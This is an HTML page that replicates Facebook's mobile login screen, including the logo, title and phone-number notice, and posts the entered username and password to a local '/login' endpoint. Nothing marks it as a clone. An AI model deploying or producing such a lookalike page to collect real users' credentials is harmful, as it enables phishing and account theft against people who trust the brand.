<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .top-nav {
            width: 100%;
            display: flex;
            justify-content: flex-start;
        }
        .back-arrow {
            color: #ffffff;
            font-size: 20px;
            text-decoration: none;
        }
        .container {
            width: 100%;
            max-width: 360px;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: auto;
            margin-top: 20px;
        }
        .logo-circle {
            width: 72px;
            height: 72px;
            background-color: #0064e0;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 24px;
        }
        .logo-circle svg {
            width: 40px;
            height: 40px;
            fill: #ffffff;
        }
        .notice {
            font-size: 14px;
            color: #e4e6eb;
            text-align: left;
            width: 100%;
            margin-bottom: 16px;
            line-height: 1.4;
        }
        .settings-link {
            color: #4599ff;
            text-decoration: none;
            display: block;
            width: 100%;
            text-align: left;
            font-size: 14px;
            margin-bottom: 24px;
        }
        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            background-color: #121212;
            border: 1px solid #383838;
            border-radius: 6px;
            color: #ffffff;
            font-size: 16px;
            box-sizing: border-box;
        }
        input::placeholder {
            color: #8e8e8e;
        }
        input:focus {
            border-color: #0064e0;
            outline: none;
        }
        .btn-login {
            background-color: #0064e0;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            margin-top: 4px;
        }
        .forgot-password {
            color: #ffffff;
            font-size: 14px;
            text-decoration: none;
            margin-top: 16px;
            text-align: center;
        }
        .footer-btn {
            width: 100%;
            max-width: 360px;
            padding: 14px;
            background: transparent;
            border: 1px solid #ffffff;
            border-radius: 24px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            text-align: center;
            cursor: pointer;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="top-nav">
        <a href="#" class="back-arrow">&#8592;</a>
    </div>

    <div class="container">
        <div class="logo-circle">
            <svg viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
        </div>
        
        <div class="notice">
            Facebook requests and receives your phone number from your mobile network.
        </div>
        <a href="#" class="settings-link">Change Settings</a>

        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Mobile number or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log in</button>
        </form>

        <a href="#" class="forgot-password">Forgot password?</a>
    </div>

    <button class="footer-btn">Create new account</button>
</body>
</html>
